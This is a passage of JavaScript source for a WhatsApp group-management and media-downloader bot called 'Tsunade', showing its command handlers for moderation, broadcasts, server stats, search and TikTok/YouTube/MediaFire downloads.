                     let nama = store.messages[i].array[0].pushName
                     teks += `🧚 *Name:* ${nama}\n🧚 *Mention:* @${i.split('@')[0]}\n🧚 *Chat:* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 TsunadeBot.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `🧚 *Group Chats List* 🧚‍♀️\n\n💬 *Total Groups:* ${anulistg.length} groups\n\n`
                 for (let i of anulistg) {
                     let metadata = await TsunadeBot.groupMetadata(i)
                     teks += `🧚 *Name:* ${metadata.subject}\n🧚 *Creator:* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n🧚 *JID:* ${metadata.id}\n$🧚 *Created on:* ${moment(metadata.creation * 1000).tz(timezone).format('DD/MM/YYYY HH:mm:ss')}\n$🧚 *Members:* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 TsunadeBot.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
🕒 *Response Speed:* ${latensi.toFixed(4)} seconds \n ${oldd - neww} miliseconds\n\n⏳ *Runtime:* ${runtime(process.uptime())}

💻 *Server Info*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

💾 *NodeJS Memory Usage:*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	TsunadeBot.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
	
	break
             case 'ping2': case 'botstatus2': case 'statusbot2': case 'p2': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcmznking(respon)
            }
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!MznKingTheCreator) return MznKingOwnerReply()
		            if (!q) return replygcmznking(`*Please enter a broadcast text.*`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               TsunadeBot.sendMessage(i.id, {text: `🧚 *Tsunade Broadcast* 🧚\n\n${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!MznKingTheCreator) return MznKingOwnerReply()
        if (!q) return replygcmznking(`*Please enter a broadcast text.*`)
        let getGroups = await TsunadeBot.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let mznkingcast = groups.map(v => v.id)
        replygcmznking(`✅ *Broadcasted in ${mznkingcast.length} group chats, in ${mznkingcast.length * 1.5} seconds!*`)
        for (let i of mznkingcast) {
let txt = `🧚 *Tsunade Broadcast* 🧚\n\n${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await TsunadeBot.sendMessage(i, { image:media,  caption: txt, mentions: participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await TsunadeBot.sendMessage(i, { video:media,  caption: txt, mentions: participants.map(a => a.id) })
}
            }
        replygcmznking(`✅ *Successfuly broadcasted in ${mznkingcast.length} group chats!*`)      
        break
case 'block': case 'ban': {
		if (!MznKingTheCreator) return MznKingOwnerReply()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await TsunadeBot.updateBlockStatus(users, 'block')
		await replygcmznking(`🔒 *User is blocked.*`)
	}
	break
        case 'unblock': case 'unban': {
		if (!MznKingTheCreator) return MznKingOwnerReply()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await TsunadeBot.updateBlockStatus(users, 'unblock')
		await replygcmznking(`🔓 *User is unblocked.*`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "⛔ *Blocked users:* " + banUser.length
	replygcmznking(lisben)
	}
	break
case 'afk': {
if (!m.isGroup) return MznKingGroupReply()
if (!text) return replygcmznking(`*Please provide a reason of away from keyboard.*\nFor example: ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcmznking(`😶 *${m.pushName} has gone AFK.*\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
TsunadeBot.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!MznKingTheCreator) return MznKingOwnerReply()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                TsunadeBot.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'editinfo': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!q) return replygcmznking(`*Please provide a option.*\nFor example: ${prefix+command}group close/open`)
if (args[0] == 'close') {
TsunadeBot.groupSettingUpdate(from, 'announcement')
replygcmznking(`*🔇 The group chat was muted!*`)
} else if (args[0] == 'open') {
TsunadeBot.groupSettingUpdate(from, 'not_announcement')
replygcmznking(`*🔊 Group chat unmuted!*`)
} else {
replygcmznking(`*Please provide a valid option.*\nFor example: ${prefix}group close/open`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (args.length < 1) return replygcmznking('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcmznking(`✅ *Already activated.*`)
autosticker.push(from)
fs.writeFileSync('./lib/database/autosticker.json', JSON.stringify(autosticker))
replygcmznking('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./lib/database/autosticker.json', JSON.stringify(autosticker))
replygcmznking('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (args[0] === "on") {
if (antiVirtex) return replygcmznking('*Antivirus was already activated in the group chat.*')
ntvirtex.push(from)
fs.writeFileSync('./lib/database/antivirus.json', JSON.stringify(ntvirtex))
replygcmznking('✅ *Antivirus activated in the group chat.*')
var groupe = await TsunadeBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TsunadeBot.sendMessage(from, {text: `⚠️ *Warning* ⚠️\n\n⛔ Sending virus is forbidden by group admins. if you break this rule, you will remove from this group immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcmznking('*Antivirus is not activated in the group.*')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./lib/database/antivirus.json', JSON.stringify(ntvirtex))
replygcmznking('Success in turning off antivirus this group')
} else {
  await replygcmznking(`*Please provide a valid option.*\nFor example: ${prefix + command} on/off`)
  }
  }
  break
              case 'Antilink': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (args[0] === "on") {
if (Antilink) return replygcmznking('```How can i activate when already Antilink is activated?```')
ntilinkall.push(from)
fs.writeFileSync('./lib/database/Antilinkgc.json', JSON.stringify(ntilinkall))
replygcmznking('*Antilink successfully activated.*')
var groupe = await TsunadeBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TsunadeBot.sendMessage(from, {text: `⚠️ *Warning* ⚠️,\n\nAntilink is activated in the group. if you are not an admin, Do not send other group links in the group!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilink) return replygcmznking('```How can i deactivate when already Antilink is deactivated?```')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./lib/database/Antilinkgc.json', JSON.stringify(ntilinkall))
replygcmznking('*Antilink successfully deactivated.*')
} else {
  await replygcmznking(`*Please provide a valid option.*\nFor example: ${prefix + command} on/off`)
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (args[0] === "on") {
if (antiToxic) return replygcmznking('```How can i activate when already anti-badword is activated?```')
nttoxic.push(from)
fs.writeFileSync('./lib/database/antitoxic.json', JSON.stringify(nttoxic))
replygcmznking('*Anti-badword successfully activated.*')
var groupe = await TsunadeBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TsunadeBot.sendMessage(from, {text: `\`\`\`⚠️ *Warning* ⚠️\`\`\`\n\nAnti-badword is activated in the group. Don\'t use bad words in the group!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
    if (!antiToxic) return replygcmznking('```How can I deactivate when anti-toxic is not activated?```');
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./lib/database/antitoxic.json', JSON.stringify(nttoxic))
replygcmznking('*Anti-toxic successfully deactivated.*')
} else {
  await replygcmznking(`Please provide a valid option.*\nFor example: ${prefix + command} on/off`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (args[0] === "on") {
if (antiWame) return replygcmznking('```How can i activate when already anti-wame is activated?```')
ntwame.push(from)
fs.writeFileSync('./lib/database/antiwame.json', JSON.stringify(ntwame))
replygcmznking('*Anti-wame successfully activated.*')
var groupe = await TsunadeBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TsunadeBot.sendMessage(from, {text: `⚠️ *Warning* ⚠️\n\nAntilink is activated in the group. if you\'re not an admin, Don\'t send wa.me links in the group!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcmznking('```How can i deactivate when already anti-wame is deactivated?```')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./lib/database/antiwame.json', JSON.stringify(ntwame))
replygcmznking('*Anti-wame successfully deactivated.*')
} else {
  await replygcmznking(`Please provide a valid option.*\nFor example: ${prefix + command} on/off`)
  }
  }
  break
   case 'left': {
                if (!MznKingTheCreator) return MznKingOwnerReply()
                await TsunadeBot.groupLeave(m.chat)
                await replygcmznking(`👋 *Bye, Bye. i am going!*`)
            }
            break
case 'add': {
if (!m.isGroup) return MznKingGroupReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!MznKingTheCreator) return MznKingOwnerReply()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TsunadeBot.groupParticipantsUpdate(m.chat, [users], 'add')
await replygcmznking(`*${users} added to the group!*`)
}
break
case 'mutetime': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcmznking('*Please provide a second, minute, hour for close group*\nFor example: 10 second')
}
replygcmznking(`*Close time ${q} starting from now.*`)
setTimeout(() => {
var nomor = m.participant
const close = `🔇 *Group closed by admin on timer.*`
TsunadeBot.groupSettingUpdate(from, 'announcement')
replygcmznking(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return MznKingGroupReply()
                if (!isBotAdmins) return MznKingBotAdminReply()
                if (!isAdmins) return MznKingAdminReply()
                if (!text) return replygcmznking('Please provide a valid option.*\nFor example: ${prefix}ephemeral enable/disable')
                if (args[0] === 'enable') {
                    await TsunadeBot.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                } else if (args[0] === 'disable') {
                    await TsunadeBot.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcmznking(`Done`)
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcmznking('⛔ *This message was not sent by bot!* ')
                 TsunadeBot.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': case 'invite': {
                if (!m.isGroup) return MznKingGroupReply()
                if (!isBotAdmins) return MznKingBotAdminReply()
                let response = await TsunadeBot.groupInviteCode(m.chat)
                TsunadeBot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link: ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'unmutetime': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcmznking('*Please provide a second, minute, hour for open group*\nFor example: 10 second')
}
replygcmznking(`*Open time ${q} starting from now.*`)
setTimeout(() => {
var nomor = m.participant
const open = `*🔊 *Group opened by admin on timer.*`
TsunadeBot.groupSettingUpdate(from, 'not_announcement')
replygcmznking(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TsunadeBot.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcmznking(`Done`)
}
break
case 'setbotname':{
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!text) return replygcmznking(`Where is the name?\nExample: ${prefix + command} Maazin Ahamed`)
    await TsunadeBot.updateProfileName(text)
    replygcmznking(`*Name updated on bot's profile.*`)
    }
    break
case 'setbotbio':{
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!text) return replygcmznking(`Where is the text?\nExample: ${prefix + command} Hey there, I am user of Tsunade Multi Device Bot 🧚`)
    await TsunadeBot.updateProfileStatus(text)
    replygcmznking(`*Bio updated on bot's profile.*`)
    }
    break
    case 'setgroupname': case 'setsubject': {
                if (!m.isGroup) return MznKingGroupReply()
                if (!isBotAdmins) return MznKingBotAdminReply()
                if (!isAdmins) return MznKingAdminReply()
                if (!text) return replygcmznking('*Please enter a name for group.*')
                await TsunadeBot.groupUpdateSubject(m.chat, text)
                await replygcmznking(`*Group name successfully updated.*`)
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return MznKingGroupReply()
                if (!isBotAdmins) return MznKingBotAdminReply()
                if (!isAdmins) return MznKingAdminReply()
                if (!text) return replygcmznking('*Please enter a description for group.*')
                await TsunadeBot.groupUpdateDescription(m.chat, text)
                await replygcmznking(`*Group description successfully updated.*`)
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
if (!quoted) return replygcmznking(`*Please reply to image or send image with caption.*`)
if (!/image/.test(mime)) return replygcmznking(`*Please reply to image or send image with caption: ${prefix + command}`)
if (/webp/.test(mime)) return replygcmznking(`*Please reply to image or send image with caption: ${prefix + command}`)
var mediz = await TsunadeBot.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await TsunadeBot.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcmznking(`*Group profile picture successfully updated.*`)
} else {
var memeg = await TsunadeBot.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcmznking(`Group profile picture successfully updated.*`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
    await TsunadeBot.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!MznKingTheCreator) return MznKingOwnerReply()
    await TsunadeBot.removeProfilePicture(TsunadeBot.user.id)
    replygcmznking(`*Profile picture of bot was successfully deleted.*`)
    }
    break
case 'promote': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TsunadeBot.groupParticipantsUpdate(m.chat, [users], 'promote')
await replygcmznking(`${message.promote}`)
}
break
case 'demote': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TsunadeBot.groupParticipantsUpdate(m.chat, [users], 'demote')
await replygcmznking(`${message.demote}`)
}
break
case 'hidetag': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
TsunadeBot.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'totag': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
               if (!m.quoted) return replygcmznking(`*Please reply with a text or enter text with command: ${prefix + command}`)
               TsunadeBot.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return MznKingGroupReply()
if (!isAdmins && !MznKingTheCreator) return MznKingAdminReply()
if (!isBotAdmins) return MznKingBotAdminReply()
me = m.sender
let teks = `🧚 Tsunade Tagall member 🧚
 
 🤠 *Tagger :*  @${me.split('@')[0]}
 💬 *Message : ${q ? q : 'No message!'}*\n\n`
for (let mem of participants) {
teks += `🧚 @${mem.id.split('@')[0]}\n`
}
TsunadeBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcmznking(`*Please reply with a text or enter text with command: ${prefix + command}`)
await MznKingWaitReply()
let { eBinary } = require('./lib/scrape/binary')
let eb = await eBinary(`${q}`)
replygcmznking(eb)
}
break
case 'dbinary': {
if (!q) return replygcmznking(`*Please reply with a text or enter text with command: ${prefix + command}`)
await MznKingWaitReply()
let { dBinary } = require('./lib/scrape/binary')
let db = await dBinary(`${q}`)
replygcmznking(db)
}
break
case 'remini': {
			if (!quoted) return replygcmznking(`*Please reply to image or send image with caption.*`)
			if (!/image/.test(mime)) return replygcmznking(`*Please reply to image or send image with caption: ${prefix + command}*`)
			await MznKingWaitReply()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			TsunadeBot.sendMessage(m.chat, { image: proses, caption: message.success}, { quoted: m})
			}
			break
			case 'gimage': {
                if (!text) return replygcmznking(`*Please enter a query for search image in google.*\nFor example : ${prefix + command} WhatsApp Logo`)
                await MznKingWaitReply()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    TsunadeBot.sendMessage(m.chat, { image: { url: images}, caption: `🧚 *TSUNADE GIMAGE SEARCH* 🧚\n🤠 *Query :* ${text}\n🔗 *Source :* ${images}`}, { quoted: m })
                })
            }
            case 'gimage': {

       if (!text) return replygcmznking(`*Please enter a query for search image in google.*\nFor example : ${prefix + command} WhatsApp Logo`
)
        mznkingezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)

        n = mznkingezyanu.result

        images = n[Math.floor(Math.random() * n.length)]


                TsunadeBot.sendMessage(m.chat, { image: { url: images}, caption: `🧚 *TSUNADE GIMAGE SEARCH* 🧚\n🤠 *Query :* ${text}\n🔗 *Source :* ${images}`}, { quoted: m })
        }

        break
			case 'mediafire': {
	if (args.length == 0) return replygcmznking(`*Please provide a valid url.*`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcmznking(`*Please provide a valid mediafire url.*`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 2000) return replygcmznking('🙊 *Oops, the file is too large!*')
	const result4 = `🧚 *TSUNADE MEDIAFIRE DOWNLOADER* 🧚‍♀️

📄 *Name :* ${baby1[0].nama}
📦 *Size :* ${baby1[0].size}
📁 *Format :* ${baby1[0].mime}
🔗 *Link :* ${baby1[0].link}

${global.footer}`
replygcmznking(`${result4}`)
TsunadeBot.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktok':{
if (!q) return replygcmznking( `*Please provide a valid url.*`)
if (!q.includes('tiktok')) return replygcmznking(`*Please provide a valid tiktok video url.*\nFor example: ${prefix + command} https://tiktok.com/`)
require('./lib/tiktok').Tiktok(q).then( data => {
TsunadeBot.sendMessage(m.chat, { caption: `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!q) return replygcmznking( `*Please provide a valid url.*`)
if (!q.includes('tiktok')) return replygcmznking(`*Please provide a valid tiktok video url.*\nFor example: ${prefix + command} https://tiktok.com/`)
require('./lib/tiktok').Tiktok(q).then( data => {
const mznkingtikmp3 = {url:data.audio}
TsunadeBot.sendMessage(m.chat, { audio: mznkingtikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replygcmznking(`*Please provide a query for search in google.*\nFor example: Tsunade Bot Script`)
await MznKingWaitReply()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `➢ *Title* : ${g.title}\n`
teks += `➢ *Description* : ${g.snippet}\n`
teks += `➢ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcmznking(teks)
})
}
break
case 'happymod':{
if (!q) return replygcmznking(`Example ${prefix+command} Angry Birds Rio`)
await MznKingWaitReply()
let kat = await scp1.happymod(q)
replygcmznking(util.format(kat))
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!text) return replygcmznking(`*Please provide a query for search in YouTube.*\nFor example : ${prefix + command} How to make Tsunade Bot?`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '🧚‍♀️ *TSUNADE YT SEARCH*\n\nResults for '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `🔢 *No :* ${no++}\n📹 *Type :* ${i.type}\n🆔 *Video ID :* ${i.videoId}\n📜 *Title :* ${i.title}\n👀 *Views :* ${i.views} views\n⏱️ *Duration :* ${i.timestamp}\n📅 *Uploaded on :* ${i.ago}\n🔗 *Url :* ${i.url}\n\n─────────────────\n\n`
                }
                TsunadeBot.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'play':{
if (!text) return replygcmznking(`*Please provide a query for search in YouTube.*\nExample : ${prefix+command} How to make Tsunade Bot?`)
await MznKingWaitReply()
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
*${anu.title}*

🆔 *Video ID :* ${anu.videoId}
👀 *Views :* ${anu.views}
📅 *Uploaded on :* ${anu.ago}
👨‍💼 *Author :* ${anu.author.name}
📺 *Channel :* ${anu.author.url}
🔗 *Link :* ${anu.url}

\`\`\`Would you want to download this youtube video?\nCopy the link and use ${prefix}ytmp3 link command for download audio and use ${prefix}ytmp4 link command for download video.\`\`\``
TsunadeBot.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'song': {
if (!text) return replygcmznking(`*Please enter a query or link for download YouTube video as audio.\nFor example : ${prefix + command} Naa Ready Thaan`)
const mznkingplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await mznkingplaymp3.mp3(anup3k.url)
await TsunadeBot.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'playdoc': case 'ytdoc':
                   if (args.length < 1) return replygcmznking(`*Please enter a YouTube link for download audio from YouTube.\nFor example: ${prefix + command} https://youtu.be/ABCDEF123`)
                   const { yta, ytv } = require('./lib/ytdl')
                   await MznKingWaitReply()
                   var dataa = await yts(q)
                   dataa = dataa.videos[0].url
